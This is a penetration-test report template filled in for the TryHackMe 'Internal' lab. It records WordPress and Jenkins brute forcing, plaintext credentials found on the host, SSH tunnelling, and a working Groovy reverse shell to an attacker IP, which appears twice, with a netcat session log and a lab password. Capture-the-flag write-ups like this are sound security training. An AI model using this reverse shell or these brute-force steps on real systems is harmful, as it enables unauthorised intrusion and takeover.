---
title: Internal - TryHackMe Room Report
author:
  - exampleemail@gmail.com
  - "OSID: OS-xxxxxxx"
date: 2024-08-21
subject: Markdown
keywords:
  - Markdown
  - Example
subtitle: Internal - TryHackMe Room Report
lang: en
titlepage: true
titlepage-color: DC143C
titlepage-text-color: FFFFFF
titlepage-rule-color: FFFFFF
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Internal - TryHackMe Room  Report

## Introduction

The penetration test report contains all efforts that were conducted in order to complete the Internal room on the TryHackMe platform.

## Objective

The objective of this assessment is to perform an internal penetration test against the [Internal]Lab and Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Scoping
The objective of this penetration testing engagement is to identify and evaluate potential vulnerabilities within the specified network, systems, and applications of [Client Name]. The assessment will focus on simulating real-world attack scenarios to assess the security posture of the organization's infrastructure and applications. The testing will include both external and internal perspectives, covering the following assets:

- **External Network:** [10.10.227.173]
- **Internal Network:** [All]

The penetration test will adhere to the following guidelines and constraints to ensure the safety and integrity of [Internal]'s operations:

1. **Off-Limits Attacks:**
    
    - **Denial of Service (DoS) or Distributed Denial of Service (DDoS) Attacks:** Testing will avoid any actions that could disrupt the availability of [Client]'s systems or services.
    - **Physical Security Testing:** No physical security tests will be conducted as part of this engagement, such as tailgating, social engineering targeting physical entry, or accessing secure areas.
    - **Social Engineering:** Phishing, vishing, and other social engineering tactics targeting [Client]'s  employees or customers are out of scope.
    - **Data Destruction or Corruption:** No testing actions will intentionally lead to data loss, corruption, or destruction.
    - **Email-Based Attacks:** No email-based attacks, such as spear phishing, will be performed unless explicitly authorized and scoped separately.
    
2. **Testing Windows:** The penetration testing will be conducted during the agreed-upon timeframes to minimize the impact on [Client]'s  business operations. All testing activities will be coordinated with [Client]'s  designated contact to ensure awareness and preparedness.
    
3. **Communication Protocol:** Any critical vulnerabilities discovered during testing that pose an immediate threat will be reported to [Client]'s as soon as they are identified, following the predefined escalation process.
    
4. **Confidentiality:** All information gathered during this engagement, including but not limited to network details, application data, and identified vulnerabilities, will be handled with the utmost confidentiality and shared only with authorized personnel

# Executive Summary

[AlphaGing]was tasked with performing an internal penetration test towards 
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate [Client]'s internal lab systems - the [internal.thm] domain.
AlphaGing's overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Internal's network.
When performing the attacks, [AlphaGing]was able to gain access to multiple machines, primarily due to  poor security configurations and security best practices including plaintext credentials within machines.
During the testing, [AlphaGing]had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:


## Recommendations

[AlphaGing]recommends patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

#  Methodologies

[AlphaGing]utilized a widely adopted approach to performing penetration testing that is effective in testing how well the [Client]'s Labs and Exam environments are secure.
Below is a breakout of how [AlphaGing]was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, [AlphaGing]was tasked with exploiting the lab and exam network.
The specific IP addresses were:

**Target Network**

10.10.227.173

## Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.

Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.

In some cases, some ports may not be listed.

For a breakdown of all commands listed ran and output files refer to the [Appendix](obsidian://open?vault=Personal_Pentest_Notes&file=Challenges%20%26%20CTFs%2FTryHackme%2FInternal%2FRunning%20Notes)
## Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems.
During this penetration test, [AlphaGing]was able to successfully gain access to **[X]** out of the **[X]** systems.

## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

[AlphaGing]added administrator and root level accounts on all systems compromised.
In addition to the administrative/root access, a Metasploit meterpreter service was installed on the machine to ensure that additional access could be established.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After the trophies on the exam network were completed, [AlphaGing]removed all user accounts and passwords as well as the meterpreter services installed on the system.
[Client] should not have to remove any user accounts or services from the system.

# Independent Challenges

## Target #1 - 10.10.227.173

### Service Enumeration

**Port Scan Results**

| Server IP Address | Ports Open     |
| ----------------- | -------------- |
| 10.10.227.173     | **TCP**: 22,80 |

### Initial Access - Weak Password Policy (Wordpress)

**Vulnerability Explanation:** The [Client] site is vulnerable to brute-force attacks of users. 
Attackers can use this vulnerability to cause arbitrary remote code execution and take  control of the underlying host system.

**Vulnerability Fix:** Follow Web Server and Application best practices. Consider using a timeout rule or lock accounts following a predetermined amount of failed attempts(3-5)

**Severity:** Critical

**Steps to reproduce the attack:**  The full discovery and results are included in the report appendix, however following capture of a known admin account, [AlphaGing] was able to conduct a bruteforce attack on the Wordpress admin login page obtaining full administrative access over the software and an initial shell on the host.

**Proof of Concept Code Here:** Modifications to the existing exploit was needed and is highlighted in red.


```bash
wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt


#my2boys
```

**Proof Screenshot:**

![ImgPlaceholder](img/placeholder-image-300x225.png)

\newpage

### Privilege Escalation - Plain Text User Credentials

**Vulnerability Explanation:** After establishing a foothold on target, [AlphaGing]noticed there was a suspicious file located in the `/opt` directory named `wp-save.txt` containing a system users credentials.

**Vulnerability Fix:** Remove any plain text credentials within systems. Consider employing a secrets/password manager to maintain accountability of passwords securely.

**Severity:** Critical

**Steps to reproduce the attack:**

**Proof of Concept Code:**

```base
cat /opt/wp-save.txt
```

### Post-Exploitation

##### Initial Post-Exploitation - Authenticated User

**System Proof Screenshot:** 

**Vulnerability Explanation:** The credential provided allowed [AlphaGing] to connect to the system as an authorized user and obtain the initial user flag `user.txt`

**Vulnerability Fix:** Remove any plain text credentials within systems. Consider employing a secrets/password manager to maintain accountability of passwords securely.

**Severity:** Critical

**Steps to reproduce the attack:**

**Proof of Concept Code Here:**
```bash
ssh aubreanna@10.10.227.173
```

##### Lateral Movement - Authenticated User

**System Proof Screenshot:** 

**Vulnerability Explanation:** As an authorized user, [Alphaging] was able to read a suspicious file within the user's home directory `jenkins.txt` leading to exposure of an internal application.  [Alphaging]  was then able to expose the service using an ssh proxy chain from the attacker machine.

**Vulnerability Fix:** Remove internal application information disclosure. Jenkins specifically is a known  vulnerable service with many possible attack vectors including a built-in scripting engine and shell.

**Severity:** Critical

**Steps to reproduce the attack:**
```bash
cat jenkins.txt

Internal Jenkins service is running on 172.17.0.2:8080
```

**Proof of Concept Code Here:**
```bash
#Attack Box
ssh -L 9005:172.17.0.2:8080 aubreanna@internal.thm
```

##### Lateral Movement - Authenticated User (Internal Services)

**System Proof Screenshot:** 

**Vulnerability Explanation:** Using the ssh proxy to the Jenkins service, [Alphaging] was able to brute force the user credentials of the admin user of the service [Alphaging]  was then able to run an arbitrary groovy script to obtain a reverse shell using the new user from within the Jenkins container. 

**Vulnerability Fix:** Configure authentication timeouts, max number of failed attempts, and other best practices for the Jenkins service to mitigate brute force attempts. Ensure logging is configured to report anomalies to SEIM and/or centralized logging systems for detection by SOC Analysts.

**Severity:** Critical

**Steps to reproduce the attack:**
```bash
ffuf -request Artifacts/jenkins_request -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
```

**Proof of Concept Code Here:**
```groovy
String host="10.11.93.71";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##### Lateral Movement - Authenticated User (Internal Services)

**System Proof Screenshot:** 

**Vulnerability Explanation:** Using the ssh proxy to the Jenkins service, [Alphaging] was able to brute force the user credentials of the admin user of the service [Alphaging]  was then able to run an arbitrary groovy script to obtain a reverse shell using the new user from within the Jenkins container. 

**Vulnerability Fix:** Configure authentication timeouts, max number of failed attempts, and other best practices for the Jenkins service to mitigate brute force attempts. Ensure logging is configured to report anomalies to SEIM and/or centralized logging systems for detection by SOC Analysts.

**Severity:** Critical

**Steps to reproduce the attack:**
```bash
ffuf -request Artifacts/jenkins_request -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt
```

**Proof of Concept Code Here:**
```groovy
String host="10.11.93.71";int port=4444;String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

##### Privilege Escalation - Authenticated User (Internal Services)

**System Proof Screenshot:** 

**Vulnerability Explanation:** With the reverse shell connection to the internal Jenkins service, [AlphaGing] was further able to enumerate and capture the root credentials of the host machine.

**Vulnerability Fix:** Remove any plain text credentials within systems. Consider employing a secrets/password manager to maintain accountability of passwords securely. Consider disabling root user.

**Severity:** Critical

**Steps to reproduce the attack:**
```bash
┌──(sstephens㉿kali-ppt)-[~/…/Personal_Pentest_Notes/Challenges & CTFs/TryHackme/Internal]
└─$ nc -lvnp 4444                                                                                                                                 
listening on [any] 4444 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.227.173] 52274
whoami
jenkins
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cd /opt
ls
note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:<redacted>
```

**Proof of Concept Code Here:**

##### Privilege Escalation - Root Level User (Internal Services)

**System Proof Screenshot:** 

**Vulnerability Explanation:** With the captured Root credentials, [AlphaGing] was able to use normal elevation commands to become the root user, thus obtaining total control of the target host.

**Vulnerability Fix:** Remove any plain text credentials within systems. Consider employing a secrets/password manager to maintain accountability of passwords securely. Consider disabling root user.

**Severity:** Critical

**Steps to reproduce the attack:**

```bash
aubreanna@internal:~$ su root
Password: 
<redacted for brevity>

root@internal:~# ls
root.txt  snap

root@internal:~# cat root.txt 
<redacted Root Flag>

```
# Additional Items Not Mentioned in the Report
Appendix:
[[Running Notes]]
